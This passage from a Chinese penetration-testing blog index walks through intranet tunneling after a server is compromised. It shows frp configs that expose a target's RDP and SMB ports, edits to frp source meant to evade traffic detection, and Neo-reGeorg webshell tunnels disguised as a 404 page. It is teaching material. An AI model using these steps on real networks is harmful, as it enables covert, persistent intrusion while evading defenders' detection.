<h3 id="反向代理简介"><a href="#反向代理简介" class="headerlink" title="反向代理简介"></a>反向代理简介</h3><p>刚开始的时候，代理多数是帮助内⽹client访问外⽹server⽤的。后来出现了反向代理，反向其实是指⽅向相反，即代理将来⾃外⽹客户端的请求转发到内⽹服务器，从外到内。反向代理实际运⾏⽅式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部⽹络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为⼀个服务器。</p>
<h3 id="代理的意义"><a href="#代理的意义" class="headerlink" title="代理的意义"></a>代理的意义</h3><p>我们在获得外⽹服务器的⼀定权限后发现这台服务器可以直接或者间接的访问内⽹ ，此时渗透测试进⼊后渗透阶段，⼀般情况下，内⽹中的其他机器是不允许来⾃外⽹机器的访问的。这时候，我们可以将这台外⽹服务器设置成为代理，使得我们⾃⼰的攻击机可以直接访问与操作内⽹中其他机器。按照代理协议在TCP&#x2F;IP协议栈中所处的位置，可以将正向代理分为HTTP代理和socks代理。HTTP代理技术要求所有代理流量按照HTTP协议进⾏传输，使⽤socks代理技术则可以在直接在⽹络层传输代理数据包。HTTP代理⼯作在应⽤层，socks代理⼯作在⽹络层，所以socks代理技术⽐HTTP代理快很多。</p>
<h3 id="Proxifier"><a href="#Proxifier" class="headerlink" title="Proxifier"></a>Proxifier</h3><p> Proxifier是一款功能非常强大的socks5客户端，可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。支持 64位系统，支持Xp，Vista，Win7，MAC OS  ,支持socks4，socks5，http代理协议，支持TCP，UDP协议，可以指定端口，指定IP，指定域名，指定程序等运行模式，兼容性非常好。有许多网络应用程序不支持通过代理服务器工作，Proxifier 解决了这些问题和所有限制，让你有机会不受任何限制使用你喜爱的软件。此外，它让你获得了额外的网络安全控制，创建代理隧道，并添加使用更多网络功能的权力。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/lnetstab.png"
                      alt="lnetstab"
                ></p>
<h1 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h1><p>反向代理的前提就是目标机器出网。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/reverse_proxy.png"
                      alt="reverse_proxy"
                ></p>
<h2 id="花生壳"><a href="#花生壳" class="headerlink" title="花生壳"></a>花生壳</h2><p>好处是商用，天然免杀，坏处是要直接在目标服务器安装，且这两年收费了。。。就不做介绍了。</p>
<h2 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h2><p>很好用的<strong>开源</strong>反向代理工具，<del>不过容易被杀</del>。我们用上图的拓朴做讲解。下载链接 <a class="link"   href="https://github.com/fatedier/frp%E3%80%82" >https://github.com/fatedier/frp。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h3><p>服务端可以是我们自己的vps或者有公网ip的服务器，我们这里用ubuntu:20.04为例(ip:192.168.188.133)。服务端程序为frps，frps.toml为配置文件，其内容如下：</p>
<div class="highlight-container" data-rel="Toml"><figure class="iseeu highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="attr">bindPort</span> = <span class="number">7000</span></span><br><span class="line"><span class="comment"># WenUI 端口</span></span><br><span class="line"><span class="attr">webServer.port</span> = <span class="number">7500</span></span><br><span class="line"><span class="comment"># WebUI 的账号密码</span></span><br><span class="line"><span class="attr">webServer.user</span> = <span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="attr">webServer.password</span> = <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>webServer 可选，开启以后比较方便查看连接进来的机器。</p>
<p>运行命令：</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./frps -c frps.toml</span><br><span class="line">2024/01/22 20:00:35 [I] [root.go:104] frps uses config file: frps.toml</span><br><span class="line">2024/01/22 20:00:35 [I] [service.go:225] frps tcp listen on 0.0.0.0:7000</span><br><span class="line">2024/01/22 20:00:35 [I] [root.go:113] frps started successfully</span><br><span class="line">2024/01/22 20:00:35 [I] [service.go:338] dashboard listen on 127.0.0.1:7500</span><br></pre></td></tr></table></figure></div>

<p>运行成功后访问 <code>http://127.0.0.1:7500</code> 并输入上面设置的账号密码会看到如下界面。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240122200245663.png"
                      alt="image-20240122200245663"
                ></p>
<h3 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h3><p>“客户端” 就是我们控制的目标机器，我这里以windows server 2008 R2为例(ip:192.168.188.130)。frpc是客户端程序，frpc.toml是配置文件，其内容如下：</p>
<div class="highlight-container" data-rel="Toml"><figure class="iseeu highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 服务端IP和对应端口</span></span><br><span class="line"><span class="attr">serverAddr</span> = <span class="string">&quot;192.168.188.133&quot;</span></span><br><span class="line"><span class="attr">serverPort</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="attr">webServer.port</span> = <span class="number">7500</span></span><br><span class="line"><span class="attr">webServer.user</span> = <span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="attr">webServer.password</span> = <span class="string">&quot;admin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[proxies]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;test-tcp-1&quot;</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;tcp&quot;</span></span><br><span class="line"><span class="attr">localIP</span> = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="attr">localPort</span> = <span class="number">445</span></span><br><span class="line"><span class="attr">remotePort</span> = <span class="number">7001</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[proxies]]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;test-tcp-2&quot;</span></span><br><span class="line"><span class="comment"># 连接类型</span></span><br><span class="line"><span class="attr">type</span> = <span class="string">&quot;tcp&quot;</span></span><br><span class="line"><span class="attr">localIP</span> = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="comment"># 本地要映射的端口</span></span><br><span class="line"><span class="attr">localPort</span> = <span class="number">3389</span></span><br><span class="line"><span class="comment"># 映射到远程的端口</span></span><br><span class="line"><span class="attr">remotePort</span> = <span class="number">7002</span></span><br></pre></td></tr></table></figure></div>

<p>内容很直观，不再解释。</p>
<p>运行命令：</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">&gt; .\frpc.exe -c frpc.toml</span><br><span class="line">2024/01/22 20:08:00 [I] [root.go:141] start frpc service <span class="keyword">for</span> config file [.\frpc.toml]</span><br><span class="line">2024/01/22 20:08:00 [I] [service.go:287] try to connect to server...</span><br><span class="line">2024/01/22 20:08:00 [I] [service.go:279] [1a9b265121ca3fcb] login to server success, get run <span class="built_in">id</span> [1a9b265121ca3fcb]</span><br><span class="line">2024/01/22 20:08:00 [I] [proxy_manager.go:173] [1a9b265121ca3fcb] proxy added: [test-tcp-1 test-tcp-2]</span><br><span class="line">2024/01/22 20:08:00 [I] [service.go:177] admin server listen on 127.0.0.1:7500</span><br><span class="line">2024/01/22 20:08:00 [I] [control.go:169] [1a9b265121ca3fcb] [test-tcp-1] start proxy success</span><br><span class="line">2024/01/22 20:08:00 [I] [control.go:169] [1a9b265121ca3fcb] [test-tcp-2] start proxy success</span><br></pre></td></tr></table></figure></div>

<h3 id="攻击机连接"><a href="#攻击机连接" class="headerlink" title="攻击机连接"></a>攻击机连接</h3><p>我们操控的机器，以kali为例。直接运行 <code>rdesktop 192.168.133:7002</code> 进行远程桌面连接到我们的目标机器。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240122201523740.png"
                      alt="image-20240122201523740"
                ></p>
<h3 id="特征修改-免杀"><a href="#特征修改-免杀" class="headerlink" title="特征修改(免杀)"></a>特征修改(免杀)</h3><p>有些局域网会进行流量和特征识别，从而进行拦截，可以使用 frp 的流量加密与压缩功能。但自从 frp v0.50开始，已经默认进行tls加密了。frp 连接时，客户端会发起请求到服务端，请求的内容是固定的，包含目标机器的一些信息，信息字段我们可以进行修改，文件在 <code>pkg/msg/msg.go</code> 中。</p>
<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// When frpc start, client send this message to login to server.</span></span><br><span class="line"><span class="keyword">type</span> Login <span class="keyword">struct</span> &#123;</span><br><span class="line">	Version      <span class="type">string</span>            <span class="string">`json:&quot;version,omitempty&quot;`</span></span><br><span class="line">	Hostname     <span class="type">string</span>            <span class="string">`json:&quot;hostname,omitempty&quot;`</span></span><br><span class="line">	Os           <span class="type">string</span>            <span class="string">`json:&quot;os,omitempty&quot;`</span></span><br><span class="line">	Arch         <span class="type">string</span>            <span class="string">`json:&quot;arch,omitempty&quot;`</span></span><br><span class="line">	User         <span class="type">string</span>            <span class="string">`json:&quot;user,omitempty&quot;`</span></span><br><span class="line">	PrivilegeKey <span class="type">string</span>            <span class="string">`json:&quot;privilege_key,omitempty&quot;`</span></span><br><span class="line">	Timestamp    <span class="type">int64</span>             <span class="string">`json:&quot;timestamp,omitempty&quot;`</span></span><br><span class="line">	RunID        <span class="type">string</span>            <span class="string">`json:&quot;run_id,omitempty&quot;`</span></span><br><span class="line">	Metas        <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span> <span class="string">`json:&quot;metas,omitempty&quot;`</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Currently only effective for VirtualClient.</span></span><br><span class="line">	ClientSpec ClientSpec <span class="string">`json:&quot;client_spec,omitempty&quot;`</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Some global configures.</span></span><br><span class="line">	PoolCount <span class="type">int</span> <span class="string">`json:&quot;pool_count,omitempty&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<p>frp 为了端口复用，建立 TLS 连接时第一个字节固定为 <code>0x17</code>，且后面数据包大小为 317。代码位置在 <code>pkg/util/net/tls.go</code>，其信息也可以修改，可以把第一个字符改为其他16进制。</p>
<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> net</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;crypto/tls&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line">	libnet <span class="string">&quot;github.com/fatedier/golib/net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> FRPTLSHeadByte = <span class="number">0x17</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CheckAndEnableTLSServerConnWithTimeout</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	c net.Conn, tlsConfig *tls.Config, tlsOnly <span class="type">bool</span>, timeout time.Duration,</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span> (out net.Conn, isTLS <span class="type">bool</span>, custom <span class="type">bool</span>, err <span class="type">error</span>) &#123;</span><br><span class="line">	sc, r := libnet.NewSharedConnSize(c, <span class="number">2</span>)</span><br><span class="line">	buf := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">var</span> n <span class="type">int</span></span><br><span class="line">	_ = c.SetReadDeadline(time.Now().Add(timeout))</span><br><span class="line">	n, err = r.Read(buf)</span><br><span class="line">	_ = c.SetReadDeadline(time.Time&#123;&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> &#123;</span><br><span class="line">	<span class="keyword">case</span> n == <span class="number">1</span> &amp;&amp; <span class="type">int</span>(buf[<span class="number">0</span>]) == FRPTLSHeadByte:</span><br><span class="line">		out = tls.Server(c, tlsConfig)</span><br><span class="line">		isTLS = <span class="literal">true</span></span><br><span class="line">		custom = <span class="literal">true</span></span><br><span class="line">	<span class="keyword">case</span> n == <span class="number">1</span> &amp;&amp; <span class="type">int</span>(buf[<span class="number">0</span>]) == <span class="number">0x16</span>:</span><br><span class="line">		out = tls.Server(sc, tlsConfig)</span><br><span class="line">		isTLS = <span class="literal">true</span></span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">if</span> tlsOnly &#123;</span><br><span class="line">			err = fmt.Errorf(<span class="string">&quot;non-TLS connection received on a TlsOnly server&quot;</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		out = sc</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h1><p>如果目标机器不出网的情况下，可以使用正向代理。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/proxy.png"
                      alt="proxy"
                ></p>
<h2 id="Neo-reGeorg-Proxifier"><a href="#Neo-reGeorg-Proxifier" class="headerlink" title="Neo-reGeorg+Proxifier"></a>Neo-reGeorg+Proxifier</h2><p>由于reGeorg年久失修且不支持加密，所以就不介绍了。正向代理很简单无需配置什么，并且脚本是挂在http&#x2F;https服务的，一般不会被查杀，但也需要防止静态查杀，加一些代码，做一些混淆。这里介绍几个常用伪装命令。</p>
<h3 id="伪装与上传"><a href="#伪装与上传" class="headerlink" title="伪装与上传"></a>伪装与上传</h3><p>我们可以把 www目录下的<code>error</code>，文件夹复制出来，用于做伪装。</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; python3 .\neoreg.py generate <span class="literal">-k</span> <span class="number">123456</span> <span class="operator">-f</span> error/<span class="number">404</span>.html <span class="literal">-c</span> <span class="number">404</span></span><br><span class="line">          <span class="string">&quot;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;&#x27;  &#x27;M<span class="variable">$</span>  &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@m</span></span><br><span class="line"><span class="string">        :<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;&#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">       &#x27;<span class="variable">$</span>&#x27;    &#x27;JZI&#x27;<span class="variable">$</span><span class="variable">$</span>&amp;  <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">                 &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span></span></span><br><span class="line"><span class="string">                 <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  J<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">                m<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>,</span></span><br><span class="line"><span class="string">                <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@  &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$_</span>          Neo-reGeorg</span></span><br><span class="line"><span class="string">             &#x27;1t<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27; &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&lt;</span></span><br><span class="line"><span class="string">          &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;  <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>          version 5.2.0</span></span><br><span class="line"><span class="string">               &#x27;@<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;  <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">                &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@</span></span><br><span class="line"><span class="string">             &#x27;z<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  @<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span></span></span><br><span class="line"><span class="string">                r<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>   <span class="variable">$</span><span class="variable">$</span>|</span></span><br><span class="line"><span class="string">                &#x27;<span class="variable">$</span><span class="variable">$v</span> c<span class="variable">$</span><span class="variable">$</span></span></span><br><span class="line"><span class="string">               &#x27;<span class="variable">$</span><span class="variable">$v</span> <span class="variable">$</span><span class="variable">$v</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>#</span></span><br><span class="line"><span class="string">               <span class="variable">$</span><span class="variable">$x</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$twelve</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@<span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">             @<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@L &#x27;    &#x27;&lt;@<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>`</span></span><br><span class="line"><span class="string">           <span class="variable">$</span><span class="variable">$</span>                 &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    [ Github ] https://github.com/L-codes/Neo-reGeorg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    [+] Create neoreg server files:</span></span><br><span class="line"><span class="string">       =&gt; neoreg_servers/tunnel.ashx</span></span><br><span class="line"><span class="string">       =&gt; neoreg_servers/tunnel.aspx</span></span><br><span class="line"><span class="string">       =&gt; neoreg_servers/tunnel.go</span></span><br><span class="line"><span class="string">       =&gt; neoreg_servers/tunnel.jsp</span></span><br><span class="line"><span class="string">       =&gt; neoreg_servers/tunnel.jspx</span></span><br><span class="line"><span class="string">       =&gt; neoreg_servers/tunnel.php</span></span><br></pre></td></tr></table></figure></div>

<p>-k 指定密钥，-f 指定伪装文件，-c 指定<code>httpcode</code>，然后把生成的tunnel文件改个名，传到代理服务器中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240123182522130.png"
                      alt="image-20240123182522130"
                ></p>
<h3 id="配置Proxifier"><a href="#配置Proxifier" class="headerlink" title="配置Proxifier"></a>配置Proxifier</h3><p>运行Neo-reGorg，因为我们把网站伪装成了 404，所以需要加<code>--skip</code>。</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; python3 .\neoreg.py <span class="literal">-k</span> <span class="number">123456</span> <span class="literal">-u</span> http://<span class="number">192.168</span>.<span class="number">188.133</span>/tunnel.php <span class="literal">-p</span> <span class="number">10086</span> <span class="literal">--skip</span></span><br><span class="line">          <span class="string">&quot;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;&#x27;  &#x27;M<span class="variable">$</span>  &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@m</span></span><br><span class="line"><span class="string">        :<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;&#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">       &#x27;<span class="variable">$</span>&#x27;    &#x27;JZI&#x27;<span class="variable">$</span><span class="variable">$</span>&amp;  <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">                 &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span></span></span><br><span class="line"><span class="string">                 <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  J<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">                m<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>,</span></span><br><span class="line"><span class="string">                <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@  &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$_</span>          Neo-reGeorg</span></span><br><span class="line"><span class="string">             &#x27;1t<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27; &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&lt;</span></span><br><span class="line"><span class="string">          &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;  <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>          version 5.2.0</span></span><br><span class="line"><span class="string">               &#x27;@<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;  <span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">                &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@</span></span><br><span class="line"><span class="string">             &#x27;z<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>  @<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span></span></span><br><span class="line"><span class="string">                r<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>   <span class="variable">$</span><span class="variable">$</span>|</span></span><br><span class="line"><span class="string">                &#x27;<span class="variable">$</span><span class="variable">$v</span> c<span class="variable">$</span><span class="variable">$</span></span></span><br><span class="line"><span class="string">               &#x27;<span class="variable">$</span><span class="variable">$v</span> <span class="variable">$</span><span class="variable">$v</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>#</span></span><br><span class="line"><span class="string">               <span class="variable">$</span><span class="variable">$x</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$twelve</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@<span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">             @<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@L &#x27;    &#x27;&lt;@<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>`</span></span><br><span class="line"><span class="string">           <span class="variable">$</span><span class="variable">$</span>                 &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    [ Github ] https://github.com/L-codes/Neo-reGeorg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+------------------------------------------------------------------------+</span></span><br><span class="line"><span class="string">  Log Level set to [ERROR]</span></span><br><span class="line"><span class="string">  Starting SOCKS5 server [127.0.0.1:10086]</span></span><br><span class="line"><span class="string">  Tunnel at:</span></span><br><span class="line"><span class="string">    http://192.168.188.133/tunnel.php</span></span><br><span class="line"><span class="string">+------------------------------------------------------------------------+</span></span><br></pre></td></tr></table></figure></div>

<p>接下来打开 Proxifier。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240123182900644.png"
                      alt="image-20240123182900644"
                ></p>
<p>如上图配置后，添加规则打开要代理的程序。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240123183033094.png"
                      alt="image-20240123183033094"
                ></p>
<p><code>Action</code> 选择代理。然后即可通过代理访问内网。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240123183221998.png"
                      alt="image-20240123183221998"
                ></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网隧道代理</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核分析之内存管理</title>
    <url>/2024/01/25/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E4%B9%8B%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="22a70c5e76a7bedec443441157b842d5c41a9d028285373c8a89ca70ecc60050"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Linux kernel</category>
      </categories>
      <tags>
        <tag>Linux_kernel的内存管理</tag>
      </tags>
  </entry>
</search>
